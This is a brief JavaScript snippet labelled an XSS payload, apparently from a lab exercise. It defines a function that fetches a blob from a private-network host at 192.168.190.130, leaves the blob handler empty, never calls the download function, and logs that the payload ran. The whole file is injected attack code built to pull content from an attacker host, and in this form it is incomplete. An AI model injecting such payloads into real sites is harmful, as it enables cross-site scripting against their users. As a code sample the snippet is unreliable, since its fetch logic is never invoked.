function xssPayload() {
    const download = async function () {
        fetch('http://192.168.190.130/')
            .then(response => response.blob())
            .then(function (blob) {
            });
    }
}

console.log('XSS payload executed');
xssPayload();
